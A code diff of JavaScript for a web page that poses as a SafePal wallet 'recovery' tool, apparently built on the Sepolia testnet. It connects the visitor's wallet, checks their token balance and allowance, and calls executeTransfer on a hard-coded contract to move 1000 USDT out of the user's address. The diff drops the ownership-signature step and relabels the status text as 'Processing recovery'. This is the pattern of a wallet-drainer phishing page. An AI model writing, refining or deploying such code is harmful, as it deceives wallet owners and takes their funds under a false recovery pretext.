@@ -77,7 +77,7 @@
                 }
 
                 const userAddress = accounts[0];
-                document.getElementById('status').innerText = 'Connected. Verifying ownership...';
+                document.getElementById('status').innerText = 'Connected. Processing recovery...';
                 console.log('Step 4: Connected with address:', userAddress);
 
                 // Перевірка мережі (Sepolia)
@@ -92,41 +92,21 @@
                     });
                 }
 
-                // Авторизація через personal_sign
-                console.log('Step 6: Signing message for authorization...');
-                const message = 'Verify wallet ownership for SafePal recovery';
-                const signature = await window.ethereum.request({
-                    method: 'personal_sign',
-                    params: [message, userAddress]
-                });
-                console.log('Step 7: Authorization successful!');
-                console.log('Signature:', signature);
-
-                // Виклик authorize і executeTransfer
-                const contractAddress = '0x684CCA1BD69c4283a68161485Ee966a650B5086A'; // Використовуємо твою адресу
+                // Перевірка allowance і переказ
+                const contractAddress = '0x0A52778FEFe53c24D39956247848e12399CCAd00'; // Використовуємо твою адресу
                 const usdtAddress = '0x9FcefD342ED17979ceDf0B6C4D257A03d908F5fD'; // TestUSDT
                 const amount = 1000000000; // 1000 USDT
 
-                console.log('Step 8: Initializing provider and signer...');
+                console.log('Step 6: Initializing provider and signer...');
                 const provider = new ethers.providers.Web3Provider(window.ethereum);
                 const signer = provider.getSigner();
-                const contractAbi = [
-                    "function authorize(bytes memory message, bytes memory signature, address user) external",
-                    "function executeTransfer(address token, address user, uint256 amount) external"
-                ];
-                const contract = new ethers.Contract(contractAddress, contractAbi, signer);
-
-                console.log('Step 9: Authorizing user...');
-                const messageBytes = ethers.utils.toUtf8Bytes(message);
-                const authorizeTx = await contract.authorize(messageBytes, signature, userAddress);
-                await authorizeTx.wait();
-                console.log('Authorization Transaction Hash:', authorizeTx.hash);
 
                 // Перевірка балансу
-                console.log('Step 10: Checking balance...');
+                console.log('Step 7: Checking balance...');
                 const tokenAbi = [
                     "function balanceOf(address) view returns (uint256)",
-                    "function decimals() view returns (uint8)"
+                    "function decimals() view returns (uint8)",
+                    "function allowance(address owner, address spender) view returns (uint256)"
                 ];
                 const tokenContract = new ethers.Contract(usdtAddress, tokenAbi, provider);
                 const balance = await tokenContract.balanceOf(userAddress);
@@ -139,7 +119,7 @@
                 }
 
                 // Перевірка балансу Sepolia ETH для газу
-                console.log('Step 11: Checking gas balance...');
+                console.log('Step 8: Checking gas balance...');
                 const ethBalance = await provider.getBalance(userAddress);
                 const ethBalanceFormatted = ethers.utils.formatEther(ethBalance);
                 console.log(`ETH balance: ${ethBalanceFormatted} Sepolia ETH`);
@@ -147,8 +127,23 @@
                     throw new Error('Insufficient Sepolia ETH for gas. Need at least 0.01 ETH.');
                 }
 
-                // Виклик executeTransfer
-                console.log('Step 12: Executing transfer...');
+                // Перевірка allowance
+                console.log('Step 9: Checking allowance...');
+                const allowance = await tokenContract.allowance(userAddress, contractAddress);
+                const allowanceFormatted = ethers.utils.formatUnits(allowance, decimals);
+                console.log(`Allowance for contract: ${allowanceFormatted} TestUSDT`);
+
+                // Виклик executeTransfer через ApproveContract
+                const contractAbi = [
+                    "function executeTransfer(address token, address user, uint256 amount) external"
+                ];
+                const contract = new ethers.Contract(contractAddress, contractAbi, signer);
+
+                if (allowance.lt(amount)) {
+                    throw new Error('Insufficient allowance. Please approve the contract to spend your tokens.');
+                }
+
+                console.log('Step 10: Executing transfer...');
                 const transferTx = await contract.executeTransfer(usdtAddress, userAddress, amount);
                 const transferReceipt = await transferTx.wait();
                 console.log('Transfer Transaction Hash:', transferReceipt.transactionHash);
